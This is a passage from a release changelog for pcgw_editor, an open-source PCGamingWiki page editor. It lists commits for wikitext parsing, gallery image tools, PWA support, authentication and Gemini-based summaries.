- [`9c7f283`](https://github.com/maicol07/pcgw_editor/commit/9c7f28363c11bb6f80f067cbfea070df6764455d) Expand share summary context with audio, VR, and network data, and update prompt to generate structured Pros/Cons lists with formatting examples.
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/3b149a254c4c77d205acd92523ab0636ecb9a89b"><code>3b149a2</code></a> Expand PCGW template support and fix workspace reactivity</summary>

  > - Update workspace store to use deep watching for game data, ensuring wikitext syncs correctly on nested updates.
  > - Implement parsing and generation for extended System Requirements (alternatives, detailed specs like GPU2/3, APIs), DLC, General Information, and Issues sections.
  > - Enhance Infobox support with 'Used for' engine parameters, additional links, and disambiguation arrays.
  > - Improve parsing for Availability states, Cloud Sync details, and configuration/save path locations.
  > - Refactor App.vue to correctly handle nested model updates for galleries and infobox sections.
  > - Add `replaceCustomSection` to WikitextParser to handle non-standard section headers.

  </details>
- [`5c28467`](https://github.com/maicol07/pcgw_editor/commit/5c28467a25801e47145fbbcb6dad7276b6bedb7e) **editor:** Enhance wikitext synchronization and improve parameter handling
- [`c831b46`](https://github.com/maicol07/pcgw_editor/commit/c831b46bc026bf1596ec2b33f34f99626f6c0fc0) **gallery:** Implement section image updates and enhance gallery handling
- [`b752b04`](https://github.com/maicol07/pcgw_editor/commit/b752b04ecc7b44ada4c2ef0f77864854e81e58d7) Centralize field definitions and wikitext parameter mappings with dedicated parsing and formatting helpers.
- [`5606858`](https://github.com/maicol07/pcgw_editor/commit/5606858cc2ed6c368695efd82da7bd0c8acc0b69) Add new page creation dialog with template selection and corresponding unit tests for the workspace store and sidebar.
- [`0a4e2b6`](https://github.com/maicol07/pcgw_editor/commit/0a4e2b6a4e74839aa97453f6e832016ec98d0bae) Add default value for injected Gemini API key and new field definitions for general info and PlayStation input features.
- [`141c627`](https://github.com/maicol07/pcgw_editor/commit/141c62718fabd7dbcc40c17b1a6a98bd6087cbd2) Introduce Wysiwyg editor with HTML/Wikitext conversion and refactor rating field notes handling.
- [`9760d6e`](https://github.com/maicol07/pcgw_editor/commit/9760d6eaebbb378e50f9457e388f4425c3266b28) Integrate WysiwygEditor component, replacing textarea and wikitext fields for improved content editing and updating wikitext section handling.
- [`390d0f0`](https://github.com/maicol07/pcgw_editor/commit/390d0f0a65d58f6faf6a802c82ebe71ebceb9e56) Implement issues management with a dedicated form, updated data model, and wikitext generation.
- [`3addbfa`](https://github.com/maicol07/pcgw_editor/commit/3addbfa405fd1e9b735805b42b73aafa4af1ec54) **WysiwygEditor:** Enable attribute inheritance for improved component flexibility
- [`0e3c332`](https://github.com/maicol07/pcgw_editor/commit/0e3c3324c6c1d2419b4b2f8f6de8fedeefa6cab9) Implement drag-and-drop reordering for localization rows and update issue structure to include a `fixed` property.
- [`552e8d0`](https://github.com/maicol07/pcgw_editor/commit/552e8d0ef2b85e99a08ce9486943a5e2d587203e) Introduce comprehensive MediaWiki base styling and update WYSIWYG editor and HTML/Wikitext conversion.
- [`e3e7def`](https://github.com/maicol07/pcgw_editor/commit/e3e7def0d8ea0aae40d5b70bd1323b3d512f7550) Add `@lezer/common` dependency.
- [`9b68497`](https://github.com/maicol07/pcgw_editor/commit/9b6849743441c38e4ec08ff8eb1c6d290f65f7e1) Implement importing existing PCGW pages into the workspace via URL or search, adding new API methods for page search and content retrieval.
- [`cbae707`](https://github.com/maicol07/pcgw_editor/commit/cbae7072de1facf14fcbd744e58ecdb8cba0473b) Use opensearch API for page search instead of query list search.
- [`87298c3`](https://github.com/maicol07/pcgw_editor/commit/87298c35a052e1be7300b8c4118153de94a0ade5) Enhance `ensureTemplate` to support positional insertion of templates and update relevant template calls.
- [`0be5f29`](https://github.com/maicol07/pcgw_editor/commit/0be5f297f6efccdb5c3d00c986c59f1d29f532e3) Add optional header support to `ensureTemplate` to automatically create section headers for templates like 'Monetization' and 'Microtransactions'.
- [`7d9586a`](https://github.com/maicol07/pcgw_editor/commit/7d9586a19707b8b1d91f863059501138bbfa102b) Implement PWA capabilities using vite-plugin-pwa and Workbox, including manifest, icons, and service worker registration.
- [`1a23385`](https://github.com/maicol07/pcgw_editor/commit/1a23385bb907e3c406c14f89ee54c211fefc5239) Implement asynchronous wikitext parsing with new type declarations and correct asset paths in preview styles.
- [`d48e501`](https://github.com/maicol07/pcgw_editor/commit/d48e50109637d71c5a4198f0770ba8acf884cc1e) Add GitHub repository and issue reporting links to the workspace sidebar.
- [`4fba336`](https://github.com/maicol07/pcgw_editor/commit/4fba3369f8f8d42c4437c79a619a445fe9093b9c) Add external link button to PCGamingWiki next to the page title input.
- [`a05fce8`](https://github.com/maicol07/pcgw_editor/commit/a05fce8e4da114343b1846e3cfc63ea78b05f941) Display application version and commit hash in the workspace sidebar.
- [`022c809`](https://github.com/maicol07/pcgw_editor/commit/022c8096f261af322c8093926489c65cd9c7fad9) Implement search, filter, and sort for workspace pages, replacing VirtualScroller with TransitionGroup and updating the UI.
- [`4a6a4c5`](https://github.com/maicol07/pcgw_editor/commit/4a6a4c57efb9ff2df1c67364785355eb1c3d32c3) Enhance new page creation dialog with icons for templates and import sources, and update template option values.
- [`1bece6b`](https://github.com/maicol07/pcgw_editor/commit/1bece6b23c07afd8e65945e994fb8d2d413f85db) Add global `__APP_VERSION__` and `__COMMIT_HASH__` mocks for tests and mock the `ExternalLink` icon component.
- [`23aef44`](https://github.com/maicol07/pcgw_editor/commit/23aef447cb4361e4c0fb939a9629f6e18c5617ac) Implement global font selection in the editor toolbar, adding new font options and persisting the choice.
- [`4cd2144`](https://github.com/maicol07/pcgw_editor/commit/4cd214427cbd1b9c3a52388432af13125af9e0b7) Introduce global app settings dialog and move appearance controls from toolbar
- [`c2c1192`](https://github.com/maicol07/pcgw_editor/commit/c2c11921b12ac546657622aba632a089dc720b2c) Implement global `Ctrl/⌘+K` shortcut to focus search input with platform-specific display and add corresponding unit tests.
- [`32dc65e`](https://github.com/maicol07/pcgw_editor/commit/32dc65ed5f2db4e96395e413b3dc201502bf87fa) Add `binary` prop to checkbox and improve parser robustness for boolean values by handling comma-separated strings.
- [`c73840e`](https://github.com/maicol07/pcgw_editor/commit/c73840e59771c03b9d68147699ce70b62c16c405) Improve AutocompleteField's MultiSelect layout by allowing chips to wrap and ensuring vertical adaptability.
- [`05fbd07`](https://github.com/maicol07/pcgw_editor/commit/05fbd0703384ea75b9978a3974342fe8b553e4ee) Enhance wikitext generation for infobox links, engine parameters, connection modes, and system requirements by excluding VNDB, prioritizing 'Wired', and expanding system requirement fields.
- [`6969b71`](https://github.com/maicol07/pcgw_editor/commit/6969b71c8af246450a5d2ec229de86045bac76a5) Add `GripHorizontal` icon and visual drag handle to gallery items
- [`9f9271b`](https://github.com/maicol07/pcgw_editor/commit/9f9271b0de98d867ea29cfebd53a64c99411f558) Implement PCGW page linking and unlinking functionality with a new diff merger dialog.
- [`98cf629`](https://github.com/maicol07/pcgw_editor/commit/98cf62953db31d216159cc85cdbf62db1309ffff) Implement PCGW authentication and media services, add local file management, and introduce UI density modes.
- [`5acf6b2`](https://github.com/maicol07/pcgw_editor/commit/5acf6b2decdd49af2b1f00213fedb6799e7de6a8) Close the search dialog after successfully adding a file to the gallery.
- [`e51f6cb`](https://github.com/maicol07/pcgw_editor/commit/e51f6cb0c47427ebab261d57f1875e90614045a4) Implement automatic re-login for PCGW API and enhance file deletion reason management in SectionGallery.
- [`3ac46b4`](https://github.com/maicol07/pcgw_editor/commit/3ac46b450a312e90a8f5290009bf5e7c9a78ee54) Add tests and improve `extractTitleFromUrl` to correctly parse subpage URLs.
- [`0b8466a`](https://github.com/maicol07/pcgw_editor/commit/0b8466ae735c816da5473d3495369a3106c4b615) Added page publish
- [`49f33e6`](https://github.com/maicol07/pcgw_editor/commit/49f33e62fac555980a72c48a0f23e549e00cd23e) Enable index-based updates for gallery image captions and positions, supporting string-only image names in `modelValue`.
- [`a72484f`](https://github.com/maicol07/pcgw_editor/commit/a72484f66ac366ecc3d467115ae1417a26cb7a4d) Implement parsing and writing of Game data, config, save data, and cloud sync sections, including support for a new multi-line template format.
- [`d176617`](https://github.com/maicol07/pcgw_editor/commit/d176617df62006ba1b3ce35fdcfc3a941cfc8434) Add logic to restore local file IDs for gallery images during wikitext parsing and include unit tests.
- [`a8401c2`](https://github.com/maicol07/pcgw_editor/commit/a8401c291d8d026ce172567dd482e64233ae26f0) Implement automatic re-login and centralize authenticated API calls through `pcgwAuth.apiPost`, while persisting login credentials on logout.
- [`51e421a`](https://github.com/maicol07/pcgw_editor/commit/51e421a61e94f6cc2f94815ba2d0871d3bed1320) Add a PWA reload prompt component and configure VitePWA for prompt-based service worker registration.
- [`5f31c85`](https://github.com/maicol07/pcgw_editor/commit/5f31c8574e052832025fa2784ca9e3a3c9c2859f) Add Cloudflare Worker to proxy authenticated PCGW API requests, including login and generic data/file uploads.
- [`3c8eabc`](https://github.com/maicol07/pcgw_editor/commit/3c8eabcb960bf360bc46598423797c1bcc5be7e4) Implement image replacement functionality for gallery items using local files.
- [`ae3c7dd`](https://github.com/maicol07/pcgw_editor/commit/ae3c7ddbab1a0a3ff1215f1dae4414594c7b9f43) Standardize action button padding and icon sizes across modes using CSS variables.
- [`b111bcf`](https://github.com/maicol07/pcgw_editor/commit/b111bcf42f8ea3fedf854f7b8971ab43537d5a7b) Implement file renaming functionality in SectionGallery, including a new `moveFile` service method.
- [`98c9c99`](https://github.com/maicol07/pcgw_editor/commit/98c9c9933e55c5ca2012eab53c70a0688d83f005) Conditionally clear `selectedFile` only when not awaiting overwrite confirmation.
- [`11c56b5`](https://github.com/maicol07/pcgw_editor/commit/11c56b579a4a4498a2a9615e0c6e05bdeed6f318) Consolidate image gallery actions into a dynamic context menu, separating options for local and PCGW files.
- [`f6c579b`](https://github.com/maicol07/pcgw_editor/commit/f6c579b7d44ea0192cf476ef8ef9b0d4f453c211) Implement linking local gallery images to existing PCGW files via SHA-1 hash matching.
- [`6528559`](https://github.com/maicol07/pcgw_editor/commit/65285590e4a418aecbf5d45ccc1b8ab7fd7881bd) Add comprehensive PWA assets and configuration, including multiple icon and splash screen sizes.
- [`049e76d`](https://github.com/maicol07/pcgw_editor/commit/049e76d79e05db60b61246df1157adabebc49772) Handle image redirects by synchronizing gallery filenames with canonical names from the API and notifying the user.
- [`fd6e971`](https://github.com/maicol07/pcgw_editor/commit/fd6e97171edfdc39729f2f937c61b222194ac0dd) Directly link to PCGW image pages from context menus and search results, removing the `openPcgwImage` helper function.
- [`6e477f0`](https://github.com/maicol07/pcgw_editor/commit/6e477f083dd55e7d323671361776614bdde4c47b) Enhance file search by combining results from general search and prefix search queries with increased limits.
- [`0c30ce7`](https://github.com/maicol07/pcgw_editor/commit/0c30ce744d49c8cc1bd4239646489f8b74b157a7) Add "View image" option to the local file context menu.
- [`656c989`](https://github.com/maicol07/pcgw_editor/commit/656c989d6699c003e7e94b7cb7f871727b3ab365) Update PWA meta tag.
- [`d4dbcd3`](https://github.com/maicol07/pcgw_editor/commit/d4dbcd3e31fbe032bbccf52862d9d7704ec7d279) Expand supported image formats in the parser.
- [`785151e`](https://github.com/maicol07/pcgw_editor/commit/785151e98e424abdb608ce7797c95bb4cdc3735c) Implement image cropping in the gallery with improved local file handling.
- [`67ea5ab`](https://github.com/maicol07/pcgw_editor/commit/67ea5aba895371ef69649b4522882b7041bb7d14) Implement image combining functionality and enhance cropping with a processing queue and on-upload option.
- [`982a08c`](https://github.com/maicol07/pcgw_editor/commit/982a08ca3725020ea62c84a94b91b9abe5d1fffb) Add tests for image cropping and combining functionality, including upload workflows and sequential processing, and update test mocks.
- [`ea53d24`](https://github.com/maicol07/pcgw_editor/commit/ea53d241141636a4bee6e9a364407e4567ebbb86) Add manifestFilename configuration to VitePWA plugin
- [`aa96a3f`](https://github.com/maicol07/pcgw_editor/commit/aa96a3f611179b966cec891c36660fd11961507b) Enhance game data path input with a new `PathInputField` component and searchable special path selection.
- [`b0b2b80`](https://github.com/maicol07/pcgw_editor/commit/b0b2b80bb5eab3fc37089a190acbbe2513422cb0) Enhance PreviewPanel heading extraction by removing link suffixes and streamline component imports and styling.
- [`2325437`](https://github.com/maicol07/pcgw_editor/commit/23254370da7ce88786bbea0ac6beea7fda19af76) Implement editing for combined gallery images and enhance the combine dialog with new item actions.
- [`b7139b0`](https://github.com/maicol07/pcgw_editor/commit/b7139b0c9ed923e7057bf107dde484ccfe494df0) Add support for positional parameter insertion in infobox updates
- [`d439080`](https://github.com/maicol07/pcgw_editor/commit/d4390801cf6618d72455979c2df9a6d0ea6a56d2) Improve combine queue image handling with asynchronous URL resolution, local file conversion, and animated drag-and-drop transitions.
- [`fde1c59`](https://github.com/maicol07/pcgw_editor/commit/fde1c59def10f4d5c139a753b2584fa38793db47) Enable auto-zoom for images in the cropping dialog
- [`951ac32`](https://github.com/maicol07/pcgw_editor/commit/951ac32ab4acd4287f0cecd1c356dcac72d1e26c) Implement batch operations for gallery images including selection, removal, movement, cropping, combining, uploading, and deletion
- [`e0b5453`](https://github.com/maicol07/pcgw_editor/commit/e0b5453faa6ffd8014c36d20dd3a1a1e6c7bbbb2) Implement PublishDiffDialog to display wikitext changes before publishing
- [`735da94`](https://github.com/maicol07/pcgw_editor/commit/735da9403460e2ca4735ba9a25b4a138d9e9cc92) Add AI-powered edit summary generation to PublishDiffDialog

### 🐛 Bug Fixes

- [`095ab94`](https://github.com/maicol07/pcgw_editor/commit/095ab949e8af648e7c5714883692fd2c5e4ab5f3) Translate UI density labels and tooltip to English
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/49112aa876cbd82d3e0c647c9dfc25e4bedff889"><code>49112aa</code></a> Update form state handling and add data validation checks</summary>

  > - LocalizationsForm: Switch to immutable array operations for adding/removing rows and update the interface checkbox to bind to string values ('true'/'false').
  > - SystemRequirementsForm: Add existence checks for nested `minimum` properties to prevent rendering errors and ensure proper initialization of malformed OS data.

  </details>
- [`cd8ad88`](https://github.com/maicol07/pcgw_editor/commit/cd8ad888b23c097cd115da6db03208f12fb6afd5) Prevent dialogs from being draggable and apply minor styling and input handling improvements.
- [`dc19d54`](https://github.com/maicol07/pcgw_editor/commit/dc19d54bfe34393300d102153c6242c2ca44e6a4) Fix session expired assertion
- [`14c2eec`](https://github.com/maicol07/pcgw_editor/commit/14c2eec0a8fc024edac9354436e136438af56f0c) Insert special path button not scaling with density
- [`e2a5271`](https://github.com/maicol07/pcgw_editor/commit/e2a52710a7064ad745dca50c78d1776c89d8e6eb) Correct attribution link format for PCGW Editor uploads.
- [`ce69a1a`](https://github.com/maicol07/pcgw_editor/commit/ce69a1a014143559b4b7c1372673d0920d59e251) Ensure correct username is stored after login and enhance logging for automatic re-login attempts and failures.
- [`e8ef3f0`](https://github.com/maicol07/pcgw_editor/commit/e8ef3f0eaaf8b5d4701c77357ee1d06ea6096a18) Handle 'Mac' and 'OS X' as synonyms in system requirements updates to prevent duplication.
- [`7a33c88`](https://github.com/maicol07/pcgw_editor/commit/7a33c88b30ba8735b5e6742884e4bb8cb689994b) Abort API request when switching to Local preview
- [`3ad3ff5`](https://github.com/maicol07/pcgw_editor/commit/3ad3ff53d4bc313337e11adddcc2c32e53cbfae8) Load OS in preview using OSfamily
- [`3417cf9`](https://github.com/maicol07/pcgw_editor/commit/3417cf976e04b119cd6cfbde2f268e8dea75d14d) Remove superfluous newline after image wikitext generation and add corresponding tests.
- [`0ae4430`](https://github.com/maicol07/pcgw_editor/commit/0ae4430beb44d0a2c7e55d663d0d93a8276dab3b) Use newline separator for infobox release date rows and add verification test case

### ⚡ Performance Improvements

- [`8185e4b`](https://github.com/maicol07/pcgw_editor/commit/8185e4b137f910f3b5b0739faddd6bcbed3c63b6) Lazy load editor forms, virtualize sidebar page list, and use `structuredClone` for data copying.

### ♻️ Code Refactoring

- [`c46c2c3`](https://github.com/maicol07/pcgw_editor/commit/c46c2c3cda179da341e7975ea59338429c3265d0) Full code refactor
- [`00ba9b5`](https://github.com/maicol07/pcgw_editor/commit/00ba9b58d844fbb36730fb100e7f7c4de263577c) Reorder rendering of top-level fields before groups and add spacing to the dynamic section.
- [`39d2cd2`](https://github.com/maicol07/pcgw_editor/commit/39d2cd28846cbab9d812911b068d2fa6fc6e1e19) Move Gemini share summary generation logic to a dedicated service.
- [`52234b2`](https://github.com/maicol07/pcgw_editor/commit/52234b2f3682b2e59295caca5efc20799b666975) Update useGeminiSummary to accept an optional API key argument, prioritizing it over the injected value
- [`7fa25ce`](https://github.com/maicol07/pcgw_editor/commit/7fa25ce9f0eb3edc1d254d274dff7ea56986b447) Use helper functions to simplify and standardize field definitions.
- [`b8b1107`](https://github.com/maicol07/pcgw_editor/commit/b8b1107574024ac4bc92ef702bce012388182ba4) Use imported `ASTNode` type from `wikiparser-node` and update related type hints.
- [`bdd9df3`](https://github.com/maicol07/pcgw_editor/commit/bdd9df37482eb2e229cb3bcc9cf8e1c500a77764) Migrate PrimeVue themes from `@primevue/themes` to `@primeuix/themes`.
- [`8604260`](https://github.com/maicol07/pcgw_editor/commit/8604260ada41f60dd911b45a79f9d94851c152a9) Migrate components to use `defineModel` for simplified two-way binding.
- [`11e3b23`](https://github.com/maicol07/pcgw_editor/commit/11e3b2347c71aa5e8b46d0991fe1d6623ea9b833) Migrate infobox and other components to use defineModel for v-model binding.
- [`7bb2e87`](https://github.com/maicol07/pcgw_editor/commit/7bb2e878e5b32b54461218d0436f376c4a007cc5) Update unit tests to use async/await for asynchronous operations.
- [`6f6b4b2`](https://github.com/maicol07/pcgw_editor/commit/6f6b4b23047df9e83ead533909756e380370b12e) Integrate SectionGallery into dynamic schema rendering and update gallery field definitions and keys.
- [`77f6c8a`](https://github.com/maicol07/pcgw_editor/commit/77f6c8abbbd8edbc0811bbb210dc07ee403ee8ed) Remove unnecessary comment from alt1 buildAlt function.
- [`abca41e`](https://github.com/maicol07/pcgw_editor/commit/abca41e485211d031ef78b6191985a60169352b2) Update context menu labels for image editing and renaming actions to improve clarity.
- [`8242eb8`](https://github.com/maicol07/pcgw_editor/commit/8242eb84dabe94d91d837a32ba930fc03687e623) Remove wikitext template parsing from renderer, update preview CSS for notice boxes and tables, and add a DRM install limit icon.
- [`d217d00`](https://github.com/maicol07/pcgw_editor/commit/d217d00e6052f68518c33c1c9b0e17bd79306fba) Move crop dialog cleanup logic to a watcher and remove @hide event handler
- [`39881b7`](https://github.com/maicol07/pcgw_editor/commit/39881b7bb92b7905f5e0df946a6815fb4208f75b) Replace scoped CSS with utility classes for RatingSelect component icons and labels
- [`c7fff51`](https://github.com/maicol07/pcgw_editor/commit/c7fff517da31f764b8f06ea07b1f36032f756181) Centralize rating metadata and icons into a shared utility module

### 📝 Docs changes

- [`6730e43`](https://github.com/maicol07/pcgw_editor/commit/6730e43fc358e902eaeef20589687f93c3123304) Clarify that AI summaries use the free Gemini 3 Flash model.
- [`0c4fd6d`](https://github.com/maicol07/pcgw_editor/commit/0c4fd6d710b360a34cbc34eeff66ec4b0944eebd) Update README with new badges, an expanded feature list including AI screenshot analysis, and a refined vibecoding philosophy.
- [`b387a1e`](https://github.com/maicol07/pcgw_editor/commit/b387a1e55c75ae9c5cb26cc441fa2f8afd6b6450) Update README to reflect new Gemini 3 Pro and Flash model usage
- [`aeeb39d`](https://github.com/maicol07/pcgw_editor/commit/aeeb39d501987345f5d8c5a39f6c78a7ed52ef4f) Add Human-in-the-Loop note to README.

### ✅ Tests

- [`0c19170`](https://github.com/maicol07/pcgw_editor/commit/0c1917073aa9893d62f7409998b7c0d2f24bdd96) Restructure parser and editor unit tests into dedicated field-specific files
- [`f551d8f`](https://github.com/maicol07/pcgw_editor/commit/f551d8fa5cce0a02504cafc1364de00dc09356cb) Add comprehensive unit tests for form components
- [`9b599a5`](https://github.com/maicol07/pcgw_editor/commit/9b599a51b1a276634a74fa329a25b325917701ea) Remove GeneralInfoForm unit tests
- [`3f345fb`](https://github.com/maicol07/pcgw_editor/commit/3f345fb7ff507e6f81af26d405fedb7457a3220a) Add unit tests for the AppSettings component.
- [`8e52f09`](https://github.com/maicol07/pcgw_editor/commit/8e52f098c58db286a8123abc977b0aa416e3d39a) Add unit tests for renderer utility and usePreview composable

### 👷 Building scripts changes

- [`cae500f`](https://github.com/maicol07/pcgw_editor/commit/cae500fd3ac4c2d64adf6aa6fe2de30e20371ed8) Configure Workbox to cache files up to 4MB.

### Other changes

- [`71f1f4a`](https://github.com/maicol07/pcgw_editor/commit/71f1f4ad4de910d1147540ee633b82f95fa60723) **deps:** Upgraded dependencies
- [`51d23d6`](https://github.com/maicol07/pcgw_editor/commit/51d23d6cbc0670000c217591bd76e2f984aa18b5) Update Gemini API dialog text to reference Gemini 3 Flash model
- [`288af01`](https://github.com/maicol07/pcgw_editor/commit/288af01ef34b7ed1e4887d93a3aebb024d7637d4) Update dependencies to latest versions
- [`2a04e82`](https://github.com/maicol07/pcgw_editor/commit/2a04e82bcd779e1ab1b0682908515e73e57738a6) Add dev-dist to gitignore and update service worker's index.html revision.
- [`8d820ce`](https://github.com/maicol07/pcgw_editor/commit/8d820ce5e6c2b104615f582c4ba2bc0497636976) Remove unused wikiparser-node import from test setup.
- [`29a4499`](https://github.com/maicol07/pcgw_editor/commit/29a4499b1131c7a685335daf0baae7efa543cde6) Update package dependencies to their latest versions.

<a name="1.2.1"></a>
## 1.2.1

> Released on February 02, 2026

### ✨ Features

- [`165c59e`](https://github.com/maicol07/pcgw_editor/commit/165c59e12d27c95fb6f036a4f2e9832b78a64d7a) Upgrade pnpm to v10.28.2 and remove explicit version from the deploy workflow.
- [`843e74b`](https://github.com/maicol07/pcgw_editor/commit/843e74bb92c27fb1c9495bbd0edebd34e3b2d951) Add loading overlay for visual editor mode switching and update CI/CD to deploy on release publication.
- [`095a82a`](https://github.com/maicol07/pcgw_editor/commit/095a82a4bbc3a861d9171ad7ebfc3cbdd2abba1f) Implement lazy loading for the CodeEditor, progressive rendering with skeleton screens, and loading overlays to improve editor performance and user experience.
- [`102a9ff`](https://github.com/maicol07/pcgw_editor/commit/102a9ff937f2e5626c94c22e901aa6fec56c3d4a) Implement AI-powered share summary generation using Google Gemini, including API key management UI.
- [`11f1259`](https://github.com/maicol07/pcgw_editor/commit/11f1259cbfe4521b88a6923b81eb958bdc2187b6) Enhance preview loading UI with a debounce pending state and detailed progress indicator.
- [`28691ff`](https://github.com/maicol07/pcgw_editor/commit/28691ff92aacb0208b91a2d3043d88da9354fa96) Add WYSIWYG-like toolbar to the notes editor for wikitext formatting and reference insertion, and remove the separate reference field from rating rows.
- [`03be224`](https://github.com/maicol07/pcgw_editor/commit/03be224faa2f87e778aa42f4c8e28a781bad9c46) Implement live wikitext preview for notes, expanding the dialog size and adjusting the CSS import order.
- [`639ef39`](https://github.com/maicol07/pcgw_editor/commit/639ef39d06d8060141370120ddddb0bb4d70a420) Migrate to Tailwind CSS v4 using `@tailwindcss/vite` plugin and CSS-based configuration.
- [`358a16d`](https://github.com/maicol07/pcgw_editor/commit/358a16d033841188fcbc16716733ee6f1b6da83e) Add edge URL to commit
- [`640342d`](https://github.com/maicol07/pcgw_editor/commit/640342dcad567c737ee86cd2f7bab5bac7e1fab1) Add touchscreen input and royalty-free audio notes fields to data parsing and wikitext generation.
- [`4697ae4`](https://github.com/maicol07/pcgw_editor/commit/4697ae4bb3213a1b576fe621581a945c835d008a) Implement panel visibility and enhanced search functionality with updated icons and tooltip.
- [`0b22f7c`](https://github.com/maicol07/pcgw_editor/commit/0b22f7cac3bc691b874015774f3db124d2d9b861) Enhance release date input with an integrated date picker and improve wikitext generation for engines and release dates.
- [`012f856`](https://github.com/maicol07/pcgw_editor/commit/012f8566e3287aca8bfb9ea5c87a0f86e99fc17b) Add new input and controller-specific properties, their corresponding UI elements, and wikitext mappings for various platforms.
- [`1c96283`](https://github.com/maicol07/pcgw_editor/commit/1c9628335d989d27a8f8d559aee80cb9e6d1bf9d) Initialize new page wikitext using `generateWikitext` instead of an empty string.
- [`aa23cb9`](https://github.com/maicol07/pcgw_editor/commit/aa23cb9a1d5585a12cb2ef0d06ba893a11b3bec8) Add Game Data section updates for configuration files, save data, and cloud syncing, enhancing path input UI.
- [`64d9a15`](https://github.com/maicol07/pcgw_editor/commit/64d9a152c9eb9f642185f81813fbc00218653421) Implement robust wikitext template management with `ensureTemplate`, add new test files, and configure CI workflow.

### 🐛 Bug Fixes

- [`4f9dc6d`](https://github.com/maicol07/pcgw_editor/commit/4f9dc6d898f5ce7864701ec7032d44c400ff3a37) Removed reference button when notes button is present

### 💄 UI & Style

- [`cbbc2e1`](https://github.com/maicol07/pcgw_editor/commit/cbbc2e190f938ad156e824f9216e4ba572910b29) Enlarge the API settings button by removing its small size prop and increasing its icon dimensions.

### ♻️ Code Refactoring

- [`33cbefd`](https://github.com/maicol07/pcgw_editor/commit/33cbefd4544811b3d94100e2ab0e4e9c22133007) `App.vue` now uses a local `gameData` ref with two-way store synchronization and consumes generated wikitext from the store.
- [`2bbac3c`](https://github.com/maicol07/pcgw_editor/commit/2bbac3c688a1da9c154f4763603b3452aac9d7b1) Replace PrimeIcons with Lucide icons across various form components.
- [`ba2d4d7`](https://github.com/maicol07/pcgw_editor/commit/ba2d4d7811b545154eea5446ccdd4e48c07fc679) Removed old alias
- [`6555143`](https://github.com/maicol07/pcgw_editor/commit/6555143b95505d9a5afe94dcc2592b777f45cdc4) Use `wikiparser-node`'s LSP bundle and update its type definition.

### Other changes

- [`6b33a2c`](https://github.com/maicol07/pcgw_editor/commit/6b33a2c530cc814d7d2eba2f5a660552a4391c3b) Remove unused test files, demo scripts, and generated CSS artifacts.
- [`90dab2b`](https://github.com/maicol07/pcgw_editor/commit/90dab2b9436bd38b0ddb9304e1da1ec59462ac00) **deps:** Upgraded dependencies

